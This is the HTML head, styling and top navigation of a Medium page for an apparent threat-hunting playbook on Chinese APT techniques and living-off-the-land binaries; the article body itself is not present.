<!doctype html><html lang="en"><head><title data-rh="true">Playbook Hunting Chinese APT. Chinese APT TTPs and LOLBAS Operations | by SIMKRA | Jan, 2025 | Detect FYI</title><meta data-rh="true" charset="utf-8"/><meta data-rh="true" name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,maximum-scale=1"/><meta data-rh="true" name="theme-color" content="#000000"/><meta data-rh="true" name="twitter:app:name:iphone" content="Medium"/><meta data-rh="true" name="twitter:app:id:iphone" content="828256236"/><meta data-rh="true" property="al:ios:app_name" content="Medium"/><meta data-rh="true" property="al:ios:app_store_id" content="828256236"/><meta data-rh="true" property="al:android:package" content="com.medium.reader"/><meta data-rh="true" property="fb:app_id" content="542599432471018"/><meta data-rh="true" property="og:site_name" content="Medium"/><meta data-rh="true" property="og:type" content="article"/><meta data-rh="true" property="article:published_time" content="2025-01-06T17:18:51.457Z"/><meta data-rh="true" name="title" content="Playbook Hunting Chinese APT. Chinese APT TTPs and LOLBAS Operations | by SIMKRA | Jan, 2025 | Detect FYI"/><meta data-rh="true" property="og:title" content="Playbook Hunting Chinese APT"/><meta data-rh="true" property="al:android:url" content="medium://p/379a6b950492"/><meta data-rh="true" property="al:ios:url" content="medium://p/379a6b950492"/><meta data-rh="true" property="al:android:app_name" content="Medium"/><meta data-rh="true" name="description" content="This hunting guide is developed to find Chinese APT and other threat actors. Therefore, the Advisory AA23–144a, MITRE ATT&amp;CK research and Cybersecurity Advisory on Chinese state-sponsored cyber…"/><meta data-rh="true" property="og:description" content="Chinese APT TTPs and LOLBAS Operations"/><meta data-rh="true" property="og:url" content="https://detect.fyi/playbook-hunting-chinese-apt-379a6b950492"/><meta data-rh="true" property="al:web:url" content="https://detect.fyi/playbook-hunting-chinese-apt-379a6b950492"/><meta data-rh="true" property="og:image" content="https://miro.medium.com/v2/resize:fit:1200/1*ZK1JsZwQFLuKJif9jE-KeA.png"/><meta data-rh="true" property="article:author" content="https://medium.com/@simone.kraus"/><meta data-rh="true" name="author" content="SIMKRA"/><meta data-rh="true" name="robots" content="index,noarchive,follow,max-image-preview:large"/><meta data-rh="true" name="referrer" content="unsafe-url"/><meta data-rh="true" property="twitter:title" content="Playbook Hunting Chinese APT"/><meta data-rh="true" name="twitter:site" content="@Medium"/><meta data-rh="true" name="twitter:app:url:iphone" content="medium://p/379a6b950492"/><meta data-rh="true" property="twitter:description" content="Chinese APT TTPs and LOLBAS Operations"/><meta data-rh="true" name="twitter:image:src" content="https://miro.medium.com/v2/resize:fit:1200/1*ZK1JsZwQFLuKJif9jE-KeA.png"/><meta data-rh="true" name="twitter:card" content="summary_large_image"/><meta data-rh="true" name="twitter:label1" content="Reading time"/><meta data-rh="true" name="twitter:data1" content="28 min read"/><link data-rh="true" rel="icon" href="https://miro.medium.com/v2/resize:fill:256:256/1*ayMhoNccbO0IxQ1UPFv0SA.png"/><link data-rh="true" rel="search" type="application/opensearchdescription+xml" title="Medium" href="/osd.xml"/><link data-rh="true" rel="apple-touch-icon" sizes="152x152" href="https://miro.medium.com/v2/resize:fill:304:304/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="120x120" href="https://miro.medium.com/v2/resize:fill:240:240/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="76x76" href="https://miro.medium.com/v2/resize:fill:152:152/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="60x60" href="https://miro.medium.com/v2/resize:fill:120:120/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="mask-icon" href="https://miro.medium.com/v2/resize:fill:1000:1000/7*GAOKVe--MXbEJmV9230oOQ.png" color="#171717"/><link data-rh="true" id="glyph_preload_link" rel="preload" as="style" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" id="glyph_link" rel="stylesheet" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" rel="author" href="https://medium.com/@simone.kraus"/><link data-rh="true" rel="canonical" href="https://detect.fyi/playbook-hunting-chinese-apt-379a6b950492"/><link data-rh="true" rel="alternate" href="android-app://com.medium.reader/https/medium.com/p/379a6b950492"/><script data-rh="true" type="application/ld+json">{"@context":"http:\u002F\u002Fschema.org","@type":"NewsArticle","image":["https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:1200\u002F1*ZK1JsZwQFLuKJif9jE-KeA.png"],"url":"https:\u002F\u002Fdetect.fyi\u002Fplaybook-hunting-chinese-apt-379a6b950492","dateCreated":"2025-01-01T23:24:24.530Z","datePublished":"2025-01-01T23:24:24.530Z","dateModified":"2025-01-06T17:18:51.576Z","headline":"Playbook Hunting Chinese APT - Detect FYI","name":"Playbook Hunting Chinese APT - Detect FYI","description":"This hunting guide is developed to find Chinese APT and other threat actors. Therefore, the Advisory AA23–144a, MITRE ATT&CK research and Cybersecurity Advisory on Chinese state-sponsored cyber…","identifier":"379a6b950492","author":{"@type":"Person","name":"SIMKRA","url":"https:\u002F\u002Fdetect.fyi\u002F@simone.kraus"},"creator":["SIMKRA"],"publisher":{"@type":"Organization","name":"Detect FYI","url":"detect.fyi","logo":{"@type":"ImageObject","width":272,"height":60,"url":"https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:544\u002F7*V1_7XP4snlmqrc_0Njontw.png"}},"mainEntityOfPage":"https:\u002F\u002Fdetect.fyi\u002Fplaybook-hunting-chinese-apt-379a6b950492"}</script><style type="text/css" data-fela-rehydration="604" data-fela-type="STATIC">html{box-sizing:border-box;-webkit-text-size-adjust:100%}*, *:before, *:after{box-sizing:inherit}body{margin:0;padding:0;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;color:rgba(0,0,0,0.8);position:relative;min-height:100vh}h1, h2, h3, h4, h5, h6, dl, dd, ol, ul, menu, figure, blockquote, p, pre, form{margin:0}menu, ol, ul{padding:0;list-style:none;list-style-image:none}main{display:block}a{color:inherit;text-decoration:none}a, button, input{-webkit-tap-highlight-color:transparent}img, svg{vertical-align:middle}button{background:transparent;overflow:visible}button, input, optgroup, select, textarea{margin:0}:root{--reach-tabs:1;--reach-menu-button:1}#speechify-root{font-family:Sohne, sans-serif}div[data-popper-reference-hidden="true"]{visibility:hidden;pointer-events:none}.grecaptcha-badge{visibility:hidden}
/*XCode style (c) Angel Garcia <angelgarcia.mail@gmail.com>*/.hljs {background: #fff;color: black;
}/* Gray DOCTYPE selectors like WebKit */
.xml .hljs-meta {color: #c0c0c0;
}.hljs-comment,
.hljs-quote {color: #007400;
}.hljs-tag,
.hljs-attribute,
.hljs-keyword,
.hljs-selector-tag,
.hljs-literal,
.hljs-name {color: #aa0d91;
}.hljs-variable,
.hljs-template-variable {color: #3F6E74;
}.hljs-code,
.hljs-string,
.hljs-meta .hljs-string {color: #c41a16;
}.hljs-regexp,
.hljs-link {color: #0E0EFF;
}.hljs-title,
.hljs-symbol,
.hljs-bullet,
.hljs-number {color: #1c00cf;
}.hljs-section,
.hljs-meta {color: #643820;
}.hljs-title.class_,
.hljs-class .hljs-title,
.hljs-type,
.hljs-built_in,
.hljs-params {color: #5c2699;
}.hljs-attr {color: #836C28;
}.hljs-subst {color: #000;
}.hljs-formula {background-color: #eee;font-style: italic;
}.hljs-addition {background-color: #baeeba;
}.hljs-deletion {background-color: #ffc8bd;
}.hljs-selector-id,
.hljs-selector-class {color: #9b703f;
}.hljs-doctag,
.hljs-strong {font-weight: bold;
}.hljs-emphasis {font-style: italic;
}
</style><style type="text/css" data-fela-rehydration="604" data-fela-type="KEYFRAME">@-webkit-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@-moz-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}</style><style type="text/css" data-fela-rehydration="604" data-fela-type="RULE">.a{font-family:medium-content-sans-serif-font, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif}.b{font-weight:400}.c{background-color:rgba(255, 255, 255, 1)}.l{display:block}.m{position:sticky}.n{top:0}.o{z-index:500}.p{padding:0 24px}.q{align-items:center}.r{border-bottom:solid 1px #F2F2F2}.y{height:41px}.z{line-height:20px}.ab{display:flex}.ac{height:57px}.ae{flex:1 0 auto}.af{color:inherit}.ag{fill:inherit}.ah{font-size:inherit}.ai{border:inherit}.aj{font-family:inherit}.ak{letter-spacing:inherit}.al{font-weight:inherit}.am{padding:0}.an{margin:0}.ao{cursor:pointer}.ap:disabled{cursor:not-allowed}.aq:disabled{color:#6B6B6B}.ar:disabled{fill:#6B6B6B}.au{width:auto}.av path{fill:#242424}.aw{height:25px}.ax{margin-left:16px}.ay{border:none}.az{border-radius:20px}.ba{width:240px}.bb{background:#F9F9F9}.bc path{fill:#6B6B6B}.be{outline:none}.bf{font-family:sohne, "Helvetica Neue", Helvetica, Arial, sans-serif}.bg{font-size:14px}.bh{width:100%}.bi{padding:10px 20px 10px 0}.bj{background-color:transparent}.bk{color:#242424}.bl::placeholder{color:#6B6B6B}.bm{display:inline-block}.bn{margin-left:12px}.bo{margin-right:12px}.bp{border-radius:4px}.bq{margin-left:24px}.br{height:24px}.bx{background-color:#F9F9F9}.by{border-radius:50%}.bz{height:32px}.ca{width:32px}.cb{justify-content:center}.ch{max-width:680px}.ci{min-width:0}.cj{animation:k1 1.2s ease-in-out infinite}.ck{height:100vh}.cl{margin-bottom:16px}.cm{margin-top:48px}.cn{align-items:flex-start}.co{flex-direction:column}.cp{justify-content:space-between}.cq{margin-bottom:24px}.cw{width:80%}.cx{background-color:#F2F2F2}.dd{height:44px}.de{width:44px}.df{margin:auto 0}.dg{margin-bottom:4px}.dh{height:16px}.di{width:120px}.dj{width:80px}.dp{margin-bottom:8px}.dq{width:96%}.dr{width:98%}.ds{width:81%}.dt{margin-left:8px}.du{color:#6B6B6B}.dv{font-size:13px}.dw{height:100%}.ep{color:#FFFFFF}.eq{fill:#FFFFFF}.er{background:rgba(103, 140, 149, 1)}.es{border-color:rgba(103, 140, 149, 1)}.ew:disabled{cursor:inherit !important}.ex:disabled{opacity:0.3}.ey:disabled:hover{background:rgba(103, 140, 149, 1)}.ez:disabled:hover{border-color:rgba(103, 140, 149, 1)}.fa{border-radius:99em}.fb{border-width:1px}.fc{border-style:solid}.fd{box-sizing:border-box}.fe{text-decoration:none}.ff{text-align:center}.fi{margin-right:32px}.fj{position:relative}.fk{fill:#6B6B6B}.fn{background:transparent}.fo svg{margin-left:4px}.fp svg{fill:#6B6B6B}.fr{box-shadow:inset 0 0 0 1px rgba(0, 0, 0, 0.05)}.fs{position:absolute}.fu{display:none}.ga{margin:0 24px}.ge{background:rgba(255, 255, 255, 1)}.gf{border:1px solid #F2F2F2}.gg{box-shadow:0 1px 4px #F2F2F2}.gh{max-height:100vh}.gi{overflow-y:auto}.gj{left:0}.gk{top:calc(100vh + 100px)}.gl{bottom:calc(100vh + 100px)}.gm{width:10px}.gn{pointer-events:none}.go{word-break:break-word}.gp{word-wrap:break-word}.gq:after{display:block}.gr:after{content:""}.gs:after{clear:both}.gt{line-height:1.23}.gu{letter-spacing:0}.gv{font-style:normal}.gw{font-weight:700}.hr{margin-bottom:-0.27em}.hs{line-height:1.394}.in{align-items:baseline}.io{width:48px}.ip{height:48px}.iq{border:2px solid rgba(255, 255, 255, 1)}.ir{z-index:0}.is{box-shadow:none}.it{border:1px solid rgba(0, 0, 0, 0.05)}.iu{margin-left:-12px}.iv{width:28px}.iw{height:28px}.ix{z-index:1}.iy{width:24px}.iz{margin-bottom:2px}.ja{flex-wrap:nowrap}.jb{font-size:16px}.jc{line-height:24px}.je{margin:0 8px}.jf{display:inline}.jg{color:rgba(103, 140, 149, 1)}.jh{fill:rgba(103, 140, 149, 1)}.jk{flex:0 0 auto}.jn{flex-wrap:wrap}.jo{white-space:pre-wrap}.jp{margin-right:4px}.jq{overflow:hidden}.jr{max-height:20px}.js{text-overflow:ellipsis}.jt{display:-webkit-box}.ju{-webkit-line-clamp:1}.jv{-webkit-box-orient:vertical}.jw{word-break:break-all}.jy{padding-left:8px}.jz{padding-right:8px}.la> *{flex-shrink:0}.lb{overflow-x:scroll}.lc::-webkit-scrollbar{display:none}.ld{scrollbar-width:none}.le{-ms-overflow-style:none}.lf{width:74px}.lg{flex-direction:row}.lh{z-index:2}.lk{-webkit-user-select:none}.ll{border:0}.lm{fill:rgba(117, 117, 117, 1)}.lp{outline:0}.lq{user-select:none}.lr> svg{pointer-events:none}.ma{cursor:progress}.mb{opacity:1}.mc{padding:4px 0}.mf{margin-top:0px}.mg{width:16px}.mi{display:inline-flex}.mo{max-width:100%}.mp{padding:8px 2px}.mq svg{color:#6B6B6B}.nh{line-height:1.18}.ni{letter-spacing:-0.022em}.nj{font-weight:600}.oc{margin-bottom:-0.31em}.od{line-height:1.58}.oe{letter-spacing:-0.004em}.of{font-family:source-serif-pro, Georgia, Cambria, "Times New Roman", Times, serif}.ov{margin-bottom:-0.46em}.ow{box-shadow:inset 3px 0 0 0 #242424}.ox{padding-left:23px}.oy{margin-left:-20px}.oz{font-style:italic}.pf{text-decoration:underline}.pl{overflow-x:auto}.pm{font-family:source-code-pro, Menlo, Monaco, "Courier New", Courier, monospace}.pn{padding:32px}.po{border:1px solid #E5E5E5}.pp{line-height:1.4}.pq{margin-top:-0.2em}.pr{margin-bottom:-0.2em}.ps{white-space:pre}.pt{min-width:fit-content}.pz{box-shadow:inset 0 0 0 1px #F2F2F2}.qa{padding:0px}.qb{padding:16px 20px}.qc{flex:1 1 auto}.qe{max-height:40px}.qf{-webkit-line-clamp:2}.qg{margin-top:8px}.qh{margin-top:12px}.qi{width:160px}.qj{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*rdeg-9QpgRWOmAiN)}.qk{background-origin:border-box}.ql{background-size:cover}.qm{height:167px}.qn{background-position:50% 50%}.qo{margin-top:16px}.qp{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*lob0zTD2WQ3Ong9P)}.qq{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*PTyrpBdoScrwVxcw)}.qr{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*dMM_JghmxOP98AES)}.qs{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*SuGKifWSqweN6QJc)}.qt{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*KAtmNpFzusfR0N2g)}.qu{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*IZiOcqYxDDJ-W5KX)}.qv{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*bLHSs5qebiOXGw0G)}.qw{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*_PcVY711fO-7GZfD)}.qx{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*TipAYxa5r0GX_oyy)}.qy{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*ffWrCTwLo0qk9q2t)}.qz{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*0TUQAfioLWB_WdWm)}.ra{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*M97dX_tgeKM4HIiE)}.rb{line-height:1.12}.rs{margin-bottom:-0.28em}.rt{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*WF2aT_ZjlibgAeDM)}.ru{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*oXKWo7ZynLSVpKIu)}.rv{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*lRxB4UhI7_XAh01m)}.rw{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*ZRBAZLmD9zR34sgx)}.rx{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*U11lAN3d4894d1ec)}.ry{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*Si7BqkHyK_SyPduo)}.rz{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*xTvW3pbbFGmHwzWR)}.sa{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*axE9LUJy_9LB3Yh_)}.sb{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*LnWEDwqKNGjc1vm8)}.sc{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*WO9eiXLv-n8wbt-E)}.sd{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*vL998rpBiPC9TJUg)}.se{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*zYEeXCtxPBIs00If)}.sf{margin-left:auto}.sg{margin-right:auto}.sh{max-width:1374px}.si{clear:both}.sk{cursor:zoom-in}.sl{z-index:auto}.sn{height:auto}.so{margin-top:10px}.sp{max-width:728px}.ss{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*T9fypKkhm6iJ11MQ)}.st{max-width:1390px}.su{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*kh2TWb92QH0oCnBb)}.sv{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*ldcpU-tEfSZ5CNJb)}.sw{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*0yWWF7jMxdSQYMgl)}.sx{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*NCwqaxD6RDspMNij)}.sy{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*FH7YcbtwCWKQvBs5)}.sz{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*MilFvP7Ew5BPGG6P)}.ta{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*fp6bU-onZABU2i81)}.tb{margin-bottom:26px}.tc{margin-top:6px}.td{margin-right:8px}.te{padding:8px 16px}.tf{border-radius:100px}.tg{transition:background 300ms ease}.ti{white-space:nowrap}.tj{border-top:none}.tk{margin-bottom:50px}.tl{height:52px}.tm{max-height:52px}.tn{box-sizing:content-box}.to{position:static}.tq{max-width:155px}.tw{margin-right:20px}.tx{margin-bottom:64px}.ty{margin-bottom:48px}.um{border-radius:2px}.uo{height:64px}.up{width:64px}.uq{align-self:flex-end}.ur{color:rgba(255, 255, 255, 1)}.us{fill:rgba(255, 255, 255, 1)}.ut{background:rgba(25, 25, 25, 1)}.uu{border-color:rgba(25, 25, 25, 1)}.ux:disabled{opacity:0.1}.uy:disabled:hover{background:rgba(25, 25, 25, 1)}.uz:disabled:hover{border-color:rgba(25, 25, 25, 1)}.vf{padding-right:4px}.vg{font-weight:500}.vn{margin-bottom:54px}.vo{height:0px}.vp{gap:18px}.vq{fill:rgba(61, 61, 61, 1)}.wc{border-bottom:solid 1px #E5E5E5}.wd{margin-top:72px}.we{padding:24px 0}.wf{margin-bottom:0px}.wg{margin-right:16px}.as:hover:not(:disabled){color:rgba(25, 25, 25, 1)}.at:hover:not(:disabled){fill:rgba(25, 25, 25, 1)}.et:hover{background:rgba(90, 120, 127, 1)}.eu:hover{border-color:rgba(90, 120, 127, 1)}.ev:hover{cursor:pointer}.fl:hover{color:#242424}.fm:hover{fill:#242424}.fq:hover svg{fill:#242424}.ft:hover{background-color:rgba(0, 0, 0, 0.1)}.jd:hover{text-decoration:underline}.ji:hover:not(:disabled){color:rgba(90, 120, 127, 1)}.jj:hover:not(:disabled){fill:rgba(90, 120, 127, 1)}.lo:hover{fill:rgba(8, 8, 8, 1)}.md:hover{fill:#000000}.me:hover p{color:#000000}.mh:hover{color:#000000}.mr:hover svg{color:#000000}.th:hover{background-color:#F2F2F2}.un:hover{background-color:none}.uv:hover{background:#000000}.uw:hover{border-color:#242424}.vr:hover{fill:rgba(25, 25, 25, 1)}.bd:focus-within path{fill:#242424}.ln:focus{fill:rgba(8, 8, 8, 1)}.ms:focus svg{color:#000000}.sm:focus{transform:scale(1.01)}.ls:active{border-style:none}</style><style type="text/css" data-fela-rehydration="604" data-fela-type="RULE" media="all and (min-width: 1080px)">.d{display:none}.bw{width:64px}.cg{margin:0 64px}.cv{height:48px}.dc{margin-bottom:52px}.do{margin-bottom:48px}.ef{font-size:14px}.eg{line-height:20px}.em{font-size:13px}.eo{padding:5px 12px}.fh{display:flex}.fz{margin-bottom:50px}.gd{max-width:680px}.hn{font-size:42px}.ho{margin-top:1.19em}.hp{line-height:52px}.hq{letter-spacing:-0.011em}.if{font-size:22px}.ig{margin-top:0.92em}.ih{line-height:28px}.im{align-items:center}.km{border-top:solid 1px #F2F2F2}.kn{border-bottom:solid 1px #F2F2F2}.ko{margin:32px 0 0}.kp{padding:3px 8px}.ky> *{margin-right:24px}.kz> :last-child{margin-right:0}.lz{margin-top:0px}.mn{margin:0}.ny{font-size:20px}.nz{margin-top:1.72em}.oa{line-height:24px}.ob{letter-spacing:0}.os{margin-top:0.94em}.ot{line-height:32px}.ou{letter-spacing:-0.003em}.pe{margin-top:2.14em}.pk{margin-top:56px}.py{margin-top:32px}.ro{font-size:24px}.rp{margin-top:1.95em}.rq{line-height:30px}.rr{letter-spacing:-0.016em}.tv{display:inline-block}.tz{flex-direction:row}.uc{margin-bottom:0}.ud{margin-right:20px}.va{max-width:500px}.vw{margin:40px 0 0}.wb{padding-top:72px}</style><style type="text/css" data-fela-rehydration="604" data-fela-type="RULE" media="all and (max-width: 1079.98px)">.e{display:none}.ly{margin-top:0px}.sq{margin-left:auto}.sr{text-align:center}.tu{display:inline-block}</style><style type="text/css" data-fela-rehydration="604" data-fela-type="RULE" media="all and (max-width: 903.98px)">.f{display:none}.lx{margin-top:0px}.tt{display:inline-block}</style><style type="text/css" data-fela-rehydration="604" data-fela-type="RULE" media="all and (max-width: 727.98px)">.g{display:none}.lv{margin-top:0px}.lw{margin-right:0px}.qd{padding:10px 12px 10px}.ts{display:inline-block}</style><style type="text/css" data-fela-rehydration="604" data-fela-type="RULE" media="all and (max-width: 551.98px)">.h{display:none}.s{display:flex}.t{justify-content:space-between}.bs{width:24px}.cc{margin:0 24px}.cr{height:40px}.cy{margin-bottom:44px}.dk{margin-bottom:32px}.dx{font-size:13px}.dy{line-height:20px}.eh{padding:0px 8px 1px}.fv{margin-bottom:2px}.gx{font-size:32px}.gy{margin-top:1.01em}.gz{line-height:38px}.ha{letter-spacing:-0.014em}.ht{font-size:18px}.hu{margin-top:0.79em}.hv{line-height:24px}.ii{align-items:flex-start}.jl{flex-direction:column}.ka{margin:24px -24px 0}.kb{padding:0}.kq> *{margin-right:8px}.kr> :last-child{margin-right:24px}.li{margin-left:0px}.lt{margin-top:0px}.lu{margin-right:0px}.mj{margin:0}.mt{border:1px solid #F2F2F2}.mu{border-radius:99em}.mv{padding:0px 16px 0px 12px}.mw{height:38px}.mx{align-items:center}.mz svg{margin-right:8px}.nk{font-size:16px}.nl{margin-top:1.23em}.nm{letter-spacing:0}.og{margin-top:0.67em}.oh{line-height:28px}.oi{letter-spacing:-0.003em}.pa{margin-top:1.56em}.pg{margin-top:40px}.pu{margin-top:24px}.rc{font-size:20px}.rd{margin-top:1.2em}.tr{display:inline-block}.uk{margin-bottom:20px}.ul{margin-right:0}.ve{max-width:100%}.vh{font-size:24px}.vi{line-height:30px}.vj{letter-spacing:-0.016em}.vs{margin:32px 0 0}.vx{padding-top:48px}.my:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="604" data-fela-type="RULE" media="all and (min-width: 904px) and (max-width: 1079.98px)">.i{display:none}.bv{width:64px}.cf{margin:0 64px}.cu{height:48px}.db{margin-bottom:52px}.dn{margin-bottom:48px}.ed{font-size:14px}.ee{line-height:20px}.ek{font-size:13px}.el{padding:5px 12px}.fg{display:flex}.fy{margin-bottom:50px}.gc{max-width:680px}.hj{font-size:42px}.hk{margin-top:1.19em}.hl{line-height:52px}.hm{letter-spacing:-0.011em}.ic{font-size:22px}.id{margin-top:0.92em}.ie{line-height:28px}.il{align-items:center}.ki{border-top:solid 1px #F2F2F2}.kj{border-bottom:solid 1px #F2F2F2}.kk{margin:32px 0 0}.kl{padding:3px 8px}.kw> *{margin-right:24px}.kx> :last-child{margin-right:0}.mm{margin:0}.nu{font-size:20px}.nv{margin-top:1.72em}.nw{line-height:24px}.nx{letter-spacing:0}.op{margin-top:0.94em}.oq{line-height:32px}.or{letter-spacing:-0.003em}.pd{margin-top:2.14em}.pj{margin-top:56px}.px{margin-top:32px}.rk{font-size:24px}.rl{margin-top:1.95em}.rm{line-height:30px}.rn{letter-spacing:-0.016em}.ua{flex-direction:row}.ue{margin-bottom:0}.uf{margin-right:20px}.vb{max-width:500px}.vv{margin:40px 0 0}.wa{padding-top:72px}</style><style type="text/css" data-fela-rehydration="604" data-fela-type="RULE" media="all and (min-width: 728px) and (max-width: 903.98px)">.j{display:none}.w{display:flex}.x{justify-content:space-between}.bu{width:64px}.ce{margin:0 48px}.ct{height:48px}.da{margin-bottom:52px}.dm{margin-bottom:48px}.eb{font-size:13px}.ec{line-height:20px}.ej{padding:0px 8px 1px}.fx{margin-bottom:50px}.gb{max-width:680px}.hf{font-size:42px}.hg{margin-top:1.19em}.hh{line-height:52px}.hi{letter-spacing:-0.011em}.hz{font-size:22px}.ia{margin-top:0.92em}.ib{line-height:28px}.ik{align-items:center}.ke{border-top:solid 1px #F2F2F2}.kf{border-bottom:solid 1px #F2F2F2}.kg{margin:32px 0 0}.kh{padding:3px 8px}.ku> *{margin-right:24px}.kv> :last-child{margin-right:0}.ml{margin:0}.nq{font-size:20px}.nr{margin-top:1.72em}.ns{line-height:24px}.nt{letter-spacing:0}.om{margin-top:0.94em}.on{line-height:32px}.oo{letter-spacing:-0.003em}.pc{margin-top:2.14em}.pi{margin-top:56px}.pw{margin-top:32px}.rg{font-size:24px}.rh{margin-top:1.95em}.ri{line-height:30px}.rj{letter-spacing:-0.016em}.ub{flex-direction:row}.ug{margin-bottom:0}.uh{margin-right:20px}.vc{max-width:500px}.vu{margin:40px 0 0}.vz{padding-top:72px}</style><style type="text/css" data-fela-rehydration="604" data-fela-type="RULE" media="all and (min-width: 552px) and (max-width: 727.98px)">.k{display:none}.u{display:flex}.v{justify-content:space-between}.bt{width:24px}.cd{margin:0 24px}.cs{height:40px}.cz{margin-bottom:44px}.dl{margin-bottom:32px}.dz{font-size:13px}.ea{line-height:20px}.ei{padding:0px 8px 1px}.fw{margin-bottom:2px}.hb{font-size:32px}.hc{margin-top:1.01em}.hd{line-height:38px}.he{letter-spacing:-0.014em}.hw{font-size:18px}.hx{margin-top:0.79em}.hy{line-height:24px}.ij{align-items:flex-start}.jm{flex-direction:column}.kc{margin:24px 0 0}.kd{padding:0}.ks> *{margin-right:8px}.kt> :last-child{margin-right:8px}.lj{margin-left:0px}.mk{margin:0}.na{border:1px solid #F2F2F2}.nb{border-radius:99em}.nc{padding:0px 16px 0px 12px}.nd{height:38px}.ne{align-items:center}.ng svg{margin-right:8px}.nn{font-size:16px}.no{margin-top:1.23em}.np{letter-spacing:0}.oj{margin-top:0.67em}.ok{line-height:28px}.ol{letter-spacing:-0.003em}.pb{margin-top:1.56em}.ph{margin-top:40px}.pv{margin-top:24px}.re{font-size:20px}.rf{margin-top:1.2em}.ui{margin-bottom:20px}.uj{margin-right:0}.vd{max-width:100%}.vk{font-size:24px}.vl{line-height:30px}.vm{letter-spacing:-0.016em}.vt{margin:32px 0 0}.vy{padding-top:48px}.nf:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="604" data-fela-type="RULE" media="print">.tp{display:none}</style><style type="text/css" data-fela-rehydration="604" data-fela-type="RULE" media="(orientation: landscape) and (max-width: 903.98px)">.jx{max-height:none}</style><style type="text/css" data-fela-rehydration="604" data-fela-type="RULE" media="(prefers-reduced-motion: no-preference)">.sj{transition:transform 300ms cubic-bezier(0.2, 0, 0.2, 1)}</style></head><body><div id="root"><div class="a b c"><div class="d e f g h i j k"></div><script>document.domain = document.domain;</script><div class="l c"><div class="l m n o c"><div class="p q r s t u v w x i d y z"><a class="du ag dv bf ak b am an ao ap aq ar as at s u w i d q dw z" href="https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F379a6b950492&amp;%7Efeature=LoOpenInAppButton&amp;%7Echannel=ShowPostUnderCollection&amp;source=---top_nav_layout_nav----------------------------------" rel="noopener follow">Open in app<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" fill="none" viewBox="0 0 10 10" class="dt"><path fill="currentColor" d="M.985 8.485a.375.375 0 1 0 .53.53zM8.75 1.25h.375A.375.375 0 0 0 8.75.875zM8.375 6.5a.375.375 0 1 0 .75 0zM3.5.875a.375.375 0 1 0 0 .75zm-1.985 8.14 7.5-7.5-.53-.53-7.5 7.5zm6.86-7.765V6.5h.75V1.25zM3.5 1.625h5.25v-.75H3.5z"></path></svg></a><div class="ab q"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="bf b dx dy eh dz ea ei eb ec ej ek ee el em eg eo ep eq er es et eu ev ew ex ey ez fa fb fc fd bm fe ff" data-testid="headerSignUpButton" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fdetect.fyi%2Fplaybook-hunting-chinese-apt-379a6b950492&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------" rel="noopener follow">Sign up</a></span></p><div class="ax l"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" 